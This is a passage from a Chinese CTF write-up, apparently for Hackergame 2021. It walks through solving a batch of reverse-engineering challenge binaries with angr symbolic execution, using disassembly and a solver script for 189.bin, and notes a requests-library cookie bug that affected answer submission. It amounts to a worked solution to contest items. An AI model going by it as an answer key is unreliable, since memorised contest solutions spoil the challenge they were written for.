.text:00000000000013E7                 sub     r15, rbp
.text:00000000000013EA                 mov     rdi, 64AD977B00FCD255h
.text:00000000000013F4                 mov     rsi, 0CFF3F036C6A46746h
.text:00000000000013FE                 mov     rdx, r15
.text:0000000000001401                 mov     rcx, rbp
.text:0000000000001404                 call    sub_1160
.text:0000000000001409                 mov     rdi, 1AD5CBF15DDEA19Bh
.text:0000000000001413                 mov     rsi, 19CBBBC069C29800h
.text:000000000000141D                 mov     rdx, rax
.text:0000000000001420                 mov     rcx, rbp
.text:0000000000001423                 call    sub_1160
.text:0000000000001428                 mov     r9, 40B0C9F7D52F3F3Fh
.text:0000000000001432                 mov     r8, 2AEF4BED0D1DEC46h
.text:000000000000143C                 mov     [rsp+48h+var_40], rax
.text:0000000000001441                 mov     [rsp+48h+var_48], rbx
.text:0000000000001445                 db      2Eh
.text:0000000000001445                 nop     word ptr [rax+rax+00000000h]
.text:000000000000144F                 nop
```
看起来和其他程序完全一样，但不知道为什么就是解不动，而且，仅抽出一轮进行求解，也仍然是unsat  
后来（至少2小时后），尝试把执行终点从0x1441改到了0x13dd（因为发现v19的值在这里就已经确定了，但直到0x1441才赋值给了a4），就能成功求解，不知道0x1404和0x1423的两个call到底做了什么  

针对189.bin的特别求解代码：
```python
import sys
import angr
import claripy
import logging
import code
import random

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, "little")

logging.getLogger('angr').setLevel("CRITICAL")

global_context = ("./bins/189.bin", (0x4013d8, 0x401441))


filename = global_context[0]


def reverse_final_part():
    global filename
    proj = angr.Project(filename)
    state = proj.factory.blank_state(addr=0x401596)
    a3 = claripy.BVS('a3', 64)
    a4 = claripy.BVS('a4', 64)
    state.regs.r14 = claripy.BVV(0x4C46BFC2FC516059, 64)
    state.regs.r13 = claripy.BVV(0x34A187B1C7A1399A, 64)
    state.regs.r8 = claripy.BVV(0x2AEF4BED0D1DEC46, 64)
    state.regs.r9 = claripy.BVV(0x40B0C9F7D52F3F3F, 64)
    state.mem[state.regs.rsp+0x8].uint64_t = claripy.BVV(0xFBDFC49AD1961987 ^ 0x2DF576F67FD515A8, 64)
    state.mem[state.regs.rsp+0x10].uint64_t = a3
    state.mem[state.regs.rsp].uint64_t = a4

    simgr = proj.factory.simulation_manager(state)
    simgr.explore(find=0x401818)

    found = simgr.found[0]
    found.add_constraints(found.regs.rcx == 0)
    r0 = found.solver.eval(a3)
    r1 = found.solver.eval(a4)

    print(r0, r1)
    print(p64(r0)+p64(r1))
    return r0, r1


def reverse_middle_part(new_a3, new_a4):
    global filename
    proj = angr.Project(filename)
    state = proj.factory.blank_state(addr=0x4011ac)
    a3 = claripy.BVS('a3', 64)
    a4 = claripy.BVS('a4', 64)
    state.regs.r14 = claripy.BVV(0x4C46BFC2FC516059, 64)
    state.regs.r13 = claripy.BVV(0x34A187B1C7A1399A, 64)
    state.regs.r8 = claripy.BVV(0x2AEF4BED0D1DEC46, 64)
    state.regs.r9 = claripy.BVV(0x40B0C9F7D52F3F3F, 64)
    state.mem[state.regs.rsp+0x8].uint64_t = claripy.BVV(0xFBDFC49AD1961987 ^ 0x2DF576F67FD515A8, 64)
    state.mem[state.regs.rsp+0x10].uint64_t = a3
    state.mem[state.regs.rsp].uint64_t = a4

    simgr = proj.factory.simulation_manager(state)
    #simgr.explore(find=0x401450)
    simgr.explore(find=0x4013dd)

    found = simgr.found[0]
    '''
    print("final rsp", found.regs.rsp)
    print(found.regs.rbx)
    print(found.mem[found.regs.rsp+0x10].uint64_t)
    print(found.mem[found.regs.rsp].uint64_t)
    '''
    #found.add_constraints(found.mem[found.regs.rsp+0x10].uint64_t == new_a3)
    #found.add_constraints(found.mem[found.regs.rsp].uint64_t == new_a4)
    found.add_constraints(found.regs.r12 == new_a3)
    found.add_constraints(found.regs.rbx == new_a4)
    r0 = found.solver.eval(a3)
    r1 = found.solver.eval(a4)

    print(r0, r1)
    print(p64(r0)+p64(r1))
    return r0, r1

# x, y = reverse_final_part()
x, y = 14706480248683425753, 2708692238484913893
for i in range(16):
    print(i)
    x, y = reverse_middle_part(x, y)
```

最后就是256道题的答案提交，去年就被cookie的更新问题坑了，今年特意参照了去年题解的提交代码 [https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/players/mcfx/writeup.md#%E8%B6%85%E5%9F%BA%E7%A1%80%E7%9A%84%E6%95%B0%E7%90%86%E6%A8%A1%E6%8B%9F%E5%99%A8](https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/players/mcfx/writeup.md#%E8%B6%85%E5%9F%BA%E7%A1%80%E7%9A%84%E6%95%B0%E7%90%86%E6%A8%A1%E6%8B%9F%E5%99%A8 ),
发现还是不行，仿佛响应头的Set-Cookie字段没有生效  
直到查到这篇文章 [https://iyaozhen.com/python-requests-session-set-cookie-not-working.html](https://iyaozhen.com/python-requests-session-set-cookie-not-working.html )，
发现低版本requests库有bug，而本地确实很久没更新了。  
跑了一下`pip install --upgrade requests`，然后就正常了  
